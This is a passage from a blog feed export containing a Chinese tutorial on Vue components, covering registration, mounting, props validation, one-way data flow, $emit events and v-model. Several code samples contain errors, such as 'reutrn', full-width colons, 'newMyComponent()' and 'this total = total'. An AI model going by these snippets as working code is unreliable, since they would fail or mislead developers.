]]></content>
      
        
        <tags>
            
            <tag> 智能合约 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Vue-组件]]></title>
      <url>/2018/07/11/Vue%E7%BB%84%E4%BB%B6/</url>
      <content type="html"><![CDATA[<p>— 点点开发技能树  —<br>— Vue组件 及 通讯 —<br><a id="more"></a></p>
<h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><p>　　<strong>组件</strong>可以把大的框架按照HTML拆分成小块功能实现，并实现内容复用。<br>　　同时组件之间还要传递数据或参数。当然组件也有很多缺点，最后介绍模块开发的单文件组件</p>
<h2 id="组件注册和使用"><a href="#组件注册和使用" class="headerlink" title="组件注册和使用"></a>组件注册和使用</h2><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--全局注册组件--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">//my-compenent 组件名</span></div><div class="line"><span class="undefined">Vue.component('my-component',&#123;</span></div><div class="line"><span class="undefined">    //选项</span></div><div class="line"><span class="xml">    template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>局部注册组件的内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">&#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!--局部注册组件--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">var Child = &#123;</span></div><div class="line"><span class="xml">    template : '<span class="tag">&lt;<span class="name">div</span>&gt;</span>局部注册组件的内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">var app = new Vue(&#123;</span></div><div class="line"><span class="undefined">    el: 'app',</span></div><div class="line"><span class="undefined">    components: &#123;</span></div><div class="line"><span class="undefined">        //my-compenent 组件名</span></div><div class="line"><span class="undefined">        'my-component': Child</span></div><div class="line"><span class="undefined">    &#125;</span></div><div class="line"><span class="undefined">&#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<blockquote>
<p>注意局部注册的组件在其子组件中不可用,如果需要使用，需要在子组件中声明</p>
</blockquote>
<p>　</p>
<blockquote>
<p>组件命名推荐：字母全小写且必须包含一个连字符。避免和当前以及未来的 HTML 元素相冲突。</p>
</blockquote>
<h3 id="使用-挂载组件"><a href="#使用-挂载组件" class="headerlink" title="使用-挂载组件"></a>使用-挂载组件</h3><p>　　一般直接标签使用即可。但在某些情况下会受到HTML限制，比如<code>&lt;table&gt;</code>内规定只允许是<code>&lt;tr&gt;</code>,<code>&lt;td&gt;</code>,<code>&lt;th&gt;</code>等元素，所以在<code>&lt;table&gt;</code>内使用组件是无效的。这时候可以使用<code>is属性</code>来挂载组件。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--普通使用--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">my-component</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--is属性挂载组件--&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">table</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">tbody</span> <span class="attr">is</span>=<span class="string">"my-component"</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h4 id="动态挂载组件"><a href="#动态挂载组件" class="headerlink" title="动态挂载组件"></a>动态挂载组件</h4><p>　　Vue 提供了一个特殊的元素<code>&lt;component&gt;</code>用来动态地挂载不同的组件，使用<code>is</code>特性来选择要挂载的组件。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 组件会在 `currentTabComponent` 改变时改变 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">component</span> <span class="attr">v-bind:is</span>=<span class="string">"currentTabComponent"</span>&gt;</span><span class="tag">&lt;/<span class="name">component</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h4 id="手动挂载实例"><a href="#手动挂载实例" class="headerlink" title="手动挂载实例"></a>手动挂载实例</h4><p>　　Vue提供<code>Vue.extend</code>和<code>$mount()</code>两个方法来手动挂载一个实例。</p>
<ul>
<li><code>Vue.extend</code>是基础Vue构造器，创建一个“子类”，参数时一个包含组件选项的对象</li>
<li>如果Vue实例在实例化时没有收到<code>el</code>选项，他也处于“未挂载”状态</li>
<li><code>$mount</code>手动挂载一个未挂载的实例</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> = <span class="string">"mount-div"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">    //创建未挂载实例</span></div><div class="line"><span class="undefined">    var MyComponent = Vue.extend(&#123;</span></div><div class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>Hello: &#123;&#123; name &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>',</span></div><div class="line"><span class="undefined">        data: function()&#123;</span></div><div class="line"><span class="undefined">            return &#123;</span></div><div class="line"><span class="undefined">                name: 'Aresn'</span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined">    //挂载实例</span></div><div class="line"><span class="undefined">    newMyComponent().$mount('#mount-div');</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="模块化中使用组件"><a href="#模块化中使用组件" class="headerlink" title="模块化中使用组件"></a>模块化中使用组件</h3><p>　　在模块化中使用其他组件，需要在局部注册之前导入每个你想使用的组件<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//ComponentB.vue</span></div><div class="line"><span class="keyword">import</span> ComponentA <span class="keyword">from</span> <span class="string">'./ComponentA'</span></div><div class="line"><span class="keyword">import</span> ComponentC <span class="keyword">from</span> <span class="string">'./ComponentC'</span></div><div class="line"></div><div class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</div><div class="line">  components: &#123;</div><div class="line">    ComponentA,</div><div class="line">    ComponentC</div><div class="line">  &#125;,</div><div class="line">  <span class="comment">// ...</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>　　现在<code>ComponentA</code>和<code>ComponentC</code>都可以在<code>ComponentB</code>的模板中使用了。</p>
<p>　　另外可以实现一些基础模块的全局化使用：<a href="https://cn.vuejs.org/v2/guide/components-registration.html#%E5%9F%BA%E7%A1%80%E7%BB%84%E4%BB%B6%E7%9A%84%E8%87%AA%E5%8A%A8%E5%8C%96%E5%85%A8%E5%B1%80%E6%B3%A8%E5%86%8C" target="_blank" rel="external">戳这里</a></p>
<h2 id="组件选项"><a href="#组件选项" class="headerlink" title="组件选项"></a>组件选项</h2><p>　　因为组件是可复用的 Vue 实例，所以它们与 new Vue 接收相同的选项，例如 <code>data</code>、<code>computed</code>、<code>watch</code>、<code>methods</code> 以及生命周期钩子等。仅有的例外是像 <code>el</code> 这样根实例特有的选项。</p>
<p>常用的有：</p>
<ul>
<li><code>template</code> 模板</li>
<li><code>data</code> 跟实例稍有区别，必须是函数，将数据<strong>return</strong>出去</li>
<li><code>computed</code> 计算属性</li>
<li><code>methods</code> 动作</li>
<li><code>components</code> 组建中嵌套组件</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Vue.component(<span class="string">'my-component'</span>,&#123;</div><div class="line">    <span class="comment">//选项</span></div><div class="line">    template: <span class="string">'&lt;div&gt;&#123;&#123;message&#125;&#125;&lt;/div&gt;'</span>,</div><div class="line">    data: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="keyword">return</span>&#123;</div><div class="line">            message: <span class="string">'组件内容'</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;,</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
<p>　　组件中return的data如果引用了一个外部的变量，那么这个变量就不是自己独有的，而是所有相同组件共享的，牵一发而动全身。<br>　　如果想要各自独立，就需要组件通讯这个变量，再重新赋值。</p>
<h2 id="组件通讯"><a href="#组件通讯" class="headerlink" title="组件通讯"></a>组件通讯</h2><h3 id="父-gt-子-props"><a href="#父-gt-子-props" class="headerlink" title="父-&gt;子 props"></a>父-&gt;子 props</h3><p>　　通过<strong>props</strong>正向传输数据（父组件向子组件传递数据及参数）。父组件中的数据变化会传递给子组件，反过来不行。<br>　　在组件中，使用选项<strong>props</strong>来声明需要从父级接收的数据，值分为两种</p>
<ul>
<li><strong>数组</strong>：传递值</li>
<li><strong>对象</strong>：传递的值需要数据类型验证</li>
</ul>
<blockquote>
<p>额外的，每次父级组件发生更新时，子组件中所有的 prop 都将会刷新为最新的值。这意味着你不应该在一个子组件内部改变 prop。如果你这样做了，Vue 会在浏览器的控制台中发出警告。</p>
</blockquote>
<p>　　<code>props</code>中的数据类似于data，只是前者props来源于父级，后者是组件自己的数据，作用于是组件本身。<br>　　两者都可以在模板<code>template</code>、计算属性<code>computed</code>、<code>methods</code>中使用</p>
<h4 id="数组使用"><a href="#数组使用" class="headerlink" title="数组使用"></a>数组使用</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">my-component</span> <span class="attr">message</span>=<span class="string">"来自父组件的数据"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span> </div><div class="line">    <span class="comment">&lt;!-- &lt;my-component message2="来自父组件的数据2" message1="来自父组件的数据1"&gt;&lt;/my-component&gt;  --&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    Vue.component(<span class="string">'my-component'</span>,&#123;</span></div><div class="line"><span class="javascript">        props: [<span class="string">'message'</span>], <span class="comment">//['message1','message2']  多个数据</span></span></div><div class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></div><div class="line"><span class="javascript">        el: <span class="string">'#app'</span></span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<blockquote>
<p>由于HTML特性不区分大小写，在<code>props中的warningText</code>在DOM中赋值时需要用<code>warning-text=&quot;提示信息&quot;</code>，即<code>&lt;my-component warning-text=&quot;提示信息&quot;&gt;&lt;/my-component&gt;</code></p>
</blockquote>
<h4 id="对象使用——数据验证"><a href="#对象使用——数据验证" class="headerlink" title="对象使用——数据验证"></a>对象使用——数据验证</h4><p>自带验证的数据类型有：</p>
<ul>
<li>String</li>
<li>Number</li>
<li>Boolean</li>
<li>Object</li>
<li>Array</li>
<li>Function</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">Vue.component(<span class="string">'my-component'</span>,&#123;</div><div class="line">        props: &#123;</div><div class="line">            <span class="comment">//必须是数字类型</span></div><div class="line">            propA: <span class="built_in">Number</span>,</div><div class="line">            <span class="comment">//必须是字符串或数字类型</span></div><div class="line">            propB: [<span class="built_in">String</span>,<span class="built_in">Number</span>],</div><div class="line">            <span class="comment">//布尔型，如果没有定义，默认为true</span></div><div class="line">            propC: &#123;</div><div class="line">                type: <span class="built_in">Boolean</span>,</div><div class="line">                <span class="keyword">default</span>: <span class="literal">true</span></div><div class="line">            &#125;,</div><div class="line">            <span class="comment">//数字，而且必须传入</span></div><div class="line">            propD: &#123;</div><div class="line">                type: <span class="built_in">Number</span>,</div><div class="line">                required: <span class="literal">true</span></div><div class="line">            &#125;,</div><div class="line">            <span class="comment">//如果是数组或对象，默认值必须是一个函数来返回（没看懂）</span></div><div class="line">            propE: &#123;</div><div class="line">                type: <span class="built_in">Array</span>,</div><div class="line">                <span class="keyword">default</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">                    <span class="keyword">return</span> [];</div><div class="line">                &#125;</div><div class="line">            &#125;,</div><div class="line">            <span class="comment">//自定义了一个验证函数</span></div><div class="line">            propF: &#123;</div><div class="line">                validator: <span class="function"><span class="keyword">function</span> (<span class="params">value</span>)</span>&#123;</div><div class="line">                    <span class="keyword">return</span> value &gt; <span class="number">10</span>;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">        &#125;, </div><div class="line">        template: <span class="string">'&lt;div&gt;&#123;&#123; count &#125;&#125;&lt;/div&gt;'</span></div><div class="line">        data：<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">            reutrn &#123;</div><div class="line">                count: <span class="keyword">this</span>.initCount</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;)</div></pre></td></tr></table></figure>
<p>验证失败时，在开发版本下会在控制台抛出一条警告</p>
<h4 id="动态参数传入"><a href="#动态参数传入" class="headerlink" title="动态参数传入"></a>动态参数传入</h4><p>利用 <code>v-bind</code> 动态更新组件<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- :message 等于 v-bind:message --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">my-component</span> <span class="attr">:message</span>=<span class="string">"parentMessage"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span> </div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    Vue.component(<span class="string">'my-component'</span>,&#123;</span></div><div class="line"><span class="javascript">        props: [<span class="string">'message'</span>], </span></div><div class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></div><div class="line"><span class="javascript">        el: <span class="string">'#app'</span>,</span></div><div class="line"><span class="undefined">        data: &#123;</span></div><div class="line"><span class="javascript">            parentMessage: <span class="string">''</span></span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<blockquote>
<p>直接传递数字、布尔值、数组、对象 需要使用<code>v-bind</code>，即<code>:message=&quot;[1,2,3]&quot;</code><br>不然<code>message=&quot;[1,2,3]&quot;</code>传递的是字符串 </p>
</blockquote>
<p>　　如果你想要将一个对象的所有属性都作为<code>prop</code>传入，你可以使用不带参数的 <code>v-bind</code>(取代<code>v-bind:prop-name</code>)。例如，对于一个给定的对象<code>post</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//数据</span></div><div class="line">post: &#123;</div><div class="line">  id: <span class="number">1</span>,</div><div class="line">  title: <span class="string">'My Journey with Vue'</span></div><div class="line">&#125;</div><div class="line"><span class="comment">//v-bind="对象"</span></div><div class="line">&lt;blog-post v-bind=<span class="string">"post"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">blog-post</span>&gt;</span></span></div><div class="line"><span class="xml">//等价于</span></div><div class="line">&lt;blog-post</div><div class="line">  v-bind:id="post.id"</div><div class="line">  v-bind:title="post.title"</div><div class="line">&gt;&lt;/blog-post&gt;</div></pre></td></tr></table></figure></p>
<h4 id="应用-单向数据流"><a href="#应用-单向数据流" class="headerlink" title="应用-单向数据流"></a>应用-单向数据流</h4><blockquote>
<p>由于在JavaScript中对象和数组是引用类型，指向同一个内存空间，所以prop中的变量是对象和数组时，在子组件内改变是会影响父组件的</p>
</blockquote>
<p>使用场景：从父组件传递数据进来，保存原值，还可以可以随意操作<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">my-component</span> <span class="attr">:init-count</span>=<span class="string">"1"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span> </div><div class="line"><span class="comment">&lt;!-- 变为短横分割命名 / v-bind传入数字--&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    Vue.component(<span class="string">'my-component'</span>,&#123;</span></div><div class="line"><span class="javascript">        props: [<span class="string">'initCount'</span>], </span></div><div class="line"><span class="xml">        template: '<span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;&#123; count &#125;&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span>'</span></div><div class="line"><span class="javascript">        data：<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="undefined">            reutrn &#123;</span></div><div class="line"><span class="javascript">                count: <span class="keyword">this</span>.initCount</span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></div><div class="line"><span class="javascript">        el: <span class="string">'#app'</span></span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<p>还可以类似的使用<code>computed</code>转变传入值</p>
<h3 id="子-gt-父-emit-on"><a href="#子-gt-父-emit-on" class="headerlink" title="子-&gt;父 $emit $on"></a>子-&gt;父 $emit $on</h3><p>子组件需要向父组件传递数据时可以使用自定义事件——<code>$emit()</code>和<code>$on()</code></p>
<ul>
<li>子组件用<code>$emit()</code>来触发事件，父组件用<code>$on()</code>来监听子组件的事件</li>
<li>父组件也可以直接在子组件的自定义标签上使用<code>v-on</code>来监听子组件触发的自定义事件</li>
</ul>
<blockquote>
<p>跟组件和 prop 不同，事件名不存在任何自动化的大小写转换。而是触发的事件名需要完全匹配监听这个事件所用的名称。所以建议始终使用 kebab-case 的事件名。</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 此处父组件接受，执行handleGetTotal函数 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> = <span class="string">"app"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">mycomponent</span></span></div><div class="line"><span class="tag">    @<span class="attr">increase</span>=<span class="string">"handleGetTotal"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">Vue.component(<span class="string">'my-component'</span>,&#123;</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">        template: '\</span></div><div class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span>&gt;</span>\</span></div><div class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleIncrease"</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span>\</span></div><div class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span>',</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="javascript">        data：<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="undefined">            reutrn &#123;</span></div><div class="line"><span class="undefined">                counter: 0</span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="undefined">        &#125;,</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined">        methods: &#123;</span></div><div class="line"><span class="javascript">            handleIncrease: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></div><div class="line"><span class="javascript">                <span class="keyword">this</span>.counter++;</span></div><div class="line"><span class="javascript">                <span class="comment">// 此处子组件向父组件发送发送increase信号，和参数</span></span></div><div class="line"><span class="javascript">                <span class="keyword">this</span>.$emit(<span class="string">'increase'</span>,<span class="keyword">this</span>.counter);</span></div><div class="line"><span class="undefined">            &#125;</span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;);</span></div><div class="line"><span class="javascript"><span class="keyword">var</span> app =<span class="keyword">new</span> Vue(&#123;</span></div><div class="line"><span class="javascript">    el: <span class="string">'#app'</span>,</span></div><div class="line"><span class="undefined">    data: &#123;</span></div><div class="line"><span class="undefined">        total: 0</span></div><div class="line"><span class="undefined">    &#125;,</span></div><div class="line"><span class="undefined">    methods: &#123;</span></div><div class="line"><span class="javascript">        handleGetTotal: <span class="function"><span class="keyword">function</span> (<span class="params">total</span>) </span>&#123;</span></div><div class="line"><span class="javascript">            <span class="keyword">this</span> total = total;</span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;</span></div><div class="line"><span class="undefined">&#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>　　以上的 父函数 处理方式是一个方法。如果是在语句中处理，子函数抛出的参数被放在<code>$event</code>变量中</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 增加字体大小 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">blog-post</span></span></div><div class="line"><span class="tag">  <span class="attr">...</span></span></div><div class="line"><span class="tag">  <span class="attr">v-on:enlarge-text</span>=<span class="string">"postFontSize += $event"</span></span></div><div class="line"><span class="tag">&gt;</span><span class="tag">&lt;/<span class="name">blog-post</span>&gt;</span></div></pre></td></tr></table></figure>
<p><code>$emit</code>使用方法:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$emit(自定义事件名称，抛出参数)</div></pre></td></tr></table></figure></p>
<h4 id="组件使用-v-model"><a href="#组件使用-v-model" class="headerlink" title="组件使用 v-model"></a>组件使用 v-model</h4><p>　　<code>v-model:total</code> 与 <code>this.$emit(&#39;input&#39;,this.counter)</code> 实现子组件动态更新父组件数据。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">my-component</span> <span class="attr">v-model</span>=<span class="string">"total"</span>&gt;</span><span class="tag">&lt;/<span class="name">my-component</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript"><span class="comment">//组件内</span></span></div><div class="line"><span class="xml">    template：'<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"handleClick"</span>&gt;</span>+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span>'</span></div><div class="line"><span class="javascript">    data：<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></div><div class="line"><span class="javascript">        <span class="keyword">return</span> &#123;<span class="attr">counter</span>:<span class="number">0</span>&#125;</span></div><div class="line"><span class="undefined">    &#125;</span></div><div class="line"><span class="undefined">    methods： &#123;</span></div><div class="line"><span class="javascript">        handleClick: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></div><div 